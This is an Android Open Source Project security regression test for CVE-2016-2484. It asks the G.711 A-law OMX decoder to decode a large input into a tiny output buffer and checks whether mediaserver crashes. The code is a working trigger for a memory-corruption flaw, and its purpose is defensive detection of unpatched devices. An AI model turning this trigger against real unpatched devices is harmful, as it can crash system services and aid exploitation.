/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define LOG_TAG "CVE-2016-2484"

#include <OMX_Component.h>
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <utils/Errors.h>
#include <utils/String16.h>
#include <utils/StrongPointer.h>
#include "OMXUtils.h"

using namespace android;

struct DummyOMXObserver : public BnOMXObserver {
public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

protected:
  virtual ~DummyOMXObserver() {}
};

bool testAlawDecoder() {
  const char *name = "OMX.google.g711.alaw.decoder";
  IOMX::node_id node = 0;
  int fenceFd = -1;
  int bufferCnt = 4;
  sp<IMemory> memory;

  // Input buffer
  int inMemSize = 4096 * 4096;
  int inBufferSize = inMemSize / bufferCnt;

  // Output buffer
  int outMemSize = 8;
  int outBufferSize = outMemSize / bufferCnt;

  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));

  sp<IMediaPlayerService> mps = interface_cast<IMediaPlayerService>(binder);
  if (mps == NULL) {
    ALOGE("get media player service failed");
    return false;
  }

  sp<IOMX> service = mps->getOMX();
  if (service == NULL) {
    ALOGE("cannot get the omx interface");
    return false;
  }

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  ALOGI("Decoding started......................");
  status_t err = service->allocateNode(name, observer, NULL, &node);
  if (err != OK) {
    ALOGE("%s node allocation failed", name);
    return false;
  }

  // change state from loaded to idle
  err = service->sendCommand(node, OMX_CommandStateSet, OMX_StateIdle);
  if (err != OK) {
    ALOGE("sendCommand is failed in OMX_StateIdle, err: %d", err);
    service->freeNode(node);
    return false;
  }

  // Input
  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  IOMX::buffer_id inBufferId = 0;
  memory = dealerIn->allocate(inBufferSize);
  if (memory.get() == nullptr || memory->pointer() == nullptr) {
    ALOGE("memory allocate failed for port index 0, err: %d", err);
    service->freeNode(node);
    return false;
  }
  err = service->useBuffer(node, 0, memory, &inBufferId, inBufferSize);
  ALOGI("useBuffer, port index 0, err: %d", err);
  if (err != OK) {
    ALOGE("useBuffer is failed for input buffer, err: %d", err);
    service->freeNode(node);
    return false;
  }

  // Output
  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);
  IOMX::buffer_id outBufferId = 0;
  memory = dealerOut->allocate(outBufferSize);
  if (memory.get() == nullptr || memory->pointer() == nullptr) {
    ALOGE("memory allocate failed for port index 1, err: %d", err);
    service->freeNode(node);
    return false;
  }
  err = service->useBuffer(node, 1, memory, &outBufferId, outBufferSize);
  ALOGI("useBuffer, port index 1, err: %d", err);
  if (err != OK) {
    ALOGE("useBuffer is failed for output buffer, err: %d", err);
    service->freeNode(node);
    return false;
  }

  // change state from idle to executing
  err = service->sendCommand(node, OMX_CommandStateSet, OMX_StateExecuting);
  if (err != OK) {
    ALOGE("sendCommand is failed in OMX_StateExecuting, err: %d", err);
    service->freeNode(node);
    return false;
  }

  /*
   * keep running to check whether mediaserver crashes
   * Error conditions are checked for input/output buffer above. Assuming values
   * passed are valid. If mediaserver doesn't accept, it crashes the media server
   * and considered as fail case. It exits gracefully without error and considered
   * as pass case if evrything goes fine.
   */
  err = service->emptyBuffer(node, inBufferId, 0, inBufferSize, 0, 0, fenceFd);
  ALOGI("emptyBuffer, err: %d", err);

  err = service->fillBuffer(node, outBufferId, fenceFd);
  ALOGI("fillBuffer, err: %d", err);

  // free node
  err = service->freeNode(node);
  ALOGI("freeNode, err: %d", err);

  return true;
}

int main() {
  return (int)(!testAlawDecoder());
}
